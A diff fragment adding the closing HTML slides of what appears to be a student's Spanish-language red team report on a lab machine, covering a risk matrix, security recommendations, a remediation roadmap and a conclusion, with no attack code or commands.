+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SLIDE 07: MATRIZ DE RIESGO -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-cyan); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(0, 255, 255, 0.3);">
+                                <span class="holo-id" style="color: var(--c-cyan);">SLIDE_07</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-cyan); border-color: var(--c-cyan);">RIESGO</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-cyan); margin-bottom: 15px;"><i class="fas fa-table"></i>
+                                    MATRIZ DE RIESGO</h3>
+                                <table style="width: 100%; border-collapse: collapse; font-size: 0.75rem; color: #ccc;">
+                                    <thead>
+                                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.1); text-align: left;">
+                                            <th style="padding: 8px;">Vulnerabilidad</th>
+                                            <th style="padding: 8px;">Probabilidad</th>
+                                            <th style="padding: 8px;">Impacto</th>
+                                            <th style="padding: 8px;">Nivel</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                                            <td style="padding: 8px;">Servicios expuestos</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                            <td style="padding: 8px; color: var(--c-yellow);">Media</td>
+                                            <td style="padding: 8px; color: var(--c-yellow);">Medio</td>
+                                        </tr>
+                                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                                            <td style="padding: 8px;">Aplicación web vulnerable</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                        </tr>
+                                        <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                                            <td style="padding: 8px;">Credenciales inseguras</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                        </tr>
+                                        <tr>
+                                            <td style="padding: 8px;">Escalada de privilegios</td>
+                                            <td style="padding: 8px; color: var(--c-yellow);">Media</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                            <td style="padding: 8px; color: var(--c-red);">Alta</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <!-- SLIDE 08: RECOMENDACIONES -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-green); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(0, 255, 0, 0.3);">
+                                <span class="holo-id" style="color: var(--c-green);">SLIDE_08</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-green); border-color: var(--c-green);">ESTRATEGIA</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-green); margin-bottom: 15px;"><i
+                                        class="fas fa-shield-alt"></i> RECOMENDACIONES ESTRATÉGICAS</h3>
+                                <div
+                                    style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 0.8rem;">
+                                    <div style="background: rgba(0,255,0,0.05); padding: 10px; border-radius: 5px;">
+                                        <i class="fas fa-exclamation-triangle" style="color: var(--c-green);"></i>
+                                        Reducir superficie de ataque
+                                    </div>
+                                    <div style="background: rgba(0,255,0,0.05); padding: 10px; border-radius: 5px;">
+                                        <i class="fas fa-exclamation-triangle" style="color: var(--c-green);"></i>
+                                        Validación robusta en apps web
+                                    </div>
+                                    <div style="background: rgba(0,255,0,0.05); padding: 10px; border-radius: 5px;">
+                                        <i class="fas fa-exclamation-triangle" style="color: var(--c-green);"></i>
+                                        Fortalecer políticas de contraseñas
+                                    </div>
+                                    <div style="background: rgba(0,255,0,0.05); padding: 10px; border-radius: 5px;">
+                                        <i class="fas fa-exclamation-triangle" style="color: var(--c-green);"></i>
+                                        Aplicar principio de mínimo privilegio
+                                    </div>
+                                    <div style="background: rgba(0,255,0,0.05); padding: 10px; border-radius: 5px;">
+                                        <i class="fas fa-exclamation-triangle" style="color: var(--c-green);"></i>
+                                        Segmentar servicios críticos
+                                    </div>
+                                    <div style="background: rgba(0,255,0,0.05); padding: 10px; border-radius: 5px;">
+                                        <i class="fas fa-exclamation-triangle" style="color: var(--c-green);"></i>
+                                        Implementar monitoreo y alertamiento
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SLIDE 09: ROADMAP -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-cyan); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(0, 255, 255, 0.3);">
+                                <span class="holo-id" style="color: var(--c-cyan);">SLIDE_09</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-cyan); border-color: var(--c-cyan);">ROADMAP</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-cyan); margin-bottom: 15px;"><i
+                                        class="fas fa-map-marked-alt"></i> ROADMAP DE REMEDIACIÓN</h3>
+                                <div
+                                    style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; font-size: 0.75rem; color: #ccc;">
+                                    <div
+                                        style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; border-top: 3px solid var(--c-red);">
+                                        <h4 style="color: #fff; margin-bottom: 8px;">Corto Plazo (0-30 d)</h4>
+                                        <ul style="padding-left: 15px;">
+                                            <li>Cierre de servicios no esenciales</li>
+                                            <li>Cambio de credenciales</li>
+                                            <li>Corrección de vulnerabilidades web</li>
+                                        </ul>
+                                    </div>
+                                    <div
+                                        style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px; border-top: 3px solid var(--c-yellow);">
+                                        <h4 style="color: #fff; margin-bottom: 8px;">Mediano Plazo (1-3 m)</h4>
+                                        <ul style="padding-left: 15px;">
+                                            <li>Hardening del sistema</li>
+                                            <li>Implementación de controles de acceso</li>
+                                            <li>Auditoría de permisos</li>
+                                        </ul>
+                                    </div>
+                                    <div
+                                        style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; border-top: 3px solid var(--c-green);">
+                                        <h4 style="color: #fff; margin-bottom: 8px;">Largo Plazo (3-6 m)</h4>
+                                        <ul style="padding-left: 15px;">
+                                            <li>Programa continuo de pruebas</li>
+                                            <li>Implementación de SIEM</li>
+                                            <li>Capacitación en seguridad</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- SLIDE 10: CONCLUSIÓN -->
+                        <div class="holo-card"
+                            style="border-color: var(--c-purple); margin-bottom: 30px; cursor: default; opacity: 1;">
+                            <div class="holo-header" style="border-color: rgba(160, 32, 240, 0.3);">
+                                <span class="holo-id" style="color: var(--c-purple);">SLIDE_10</span>
+                                <span class="holo-status"
+                                    style="color: var(--c-purple); border-color: var(--c-purple);">CONCLUSIÓN</span>
+                            </div>
+                            <div class="holo-body">
+                                <h3 style="color: var(--c-purple); margin-bottom: 15px;"><i
+                                        class="fas fa-flag-checkered"></i> CONCLUSIÓN FINAL</h3>
+                                <div style="display: grid; grid-template-columns: 1.2fr 1fr; gap: 20px;">
+                                    <div>
+                                        <p style="font-size: 0.85rem; color: #ccc;">El sistema evaluado presenta una
+                                            combinación crítica de:</p>
+                                        <ul
+                                            style="font-size: 0.85rem; color: #ccc; margin-top: 10px; padding-left: 20px;">
+                                            <li>Exposición innecesaria de servicios</li>
+                                            <li>Debilidades en la aplicación web</li>
+                                            <li>Configuraciones inseguras</li>
+                                        </ul>
+                                        <p
+                                            style="background: var(--c-yellow); color: #000; padding: 10px; margin-top: 15px; font-weight: bold; border-radius: 4px; font-size: 0.85rem;">
+                                            ESTO PERMITIÓ A UN ATACANTE EXTERNO COMPROMETER COMPLETAMENTE EL SISTEMA.
+                                        </p>
+                                    </div>
+                                    <div
+                                        style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 8px; border-left: 3px solid var(--c-purple);">
+                                        <h4 style="font-size: 0.85rem; color: #fff; margin-bottom: 5px;">Mensaje clave:
+                                        </h4>
+                                        <p style="font-size: 0.75rem; color: #ccc; margin-bottom: 15px;">La organización
+                                            debe priorizar la reducción de la superficie de ataque y fortalecer sus
+                                            controles de acceso.</p>
+
+                                        <h4 style="font-size: 0.85rem; color: #fff; margin-bottom: 5px;">Recomendación
+                                            final:</h4>
+                                        <p style="font-size: 0.75rem; color: #ccc;">Adoptar un enfoque proactivo de
+                                            ciberseguridad basado en prevención, detección y respuesta continua.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </article>
+
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <div class="scrolling-text">
+                > FRANCISCO JAVIER CRUZ JUAREZ (177622) > ACTIVIDAD 11 > RED TEAM REPORT > NAPPING 101 >
+            </div>
+        </footer>
+    </div>
+</body>
+
+</html>
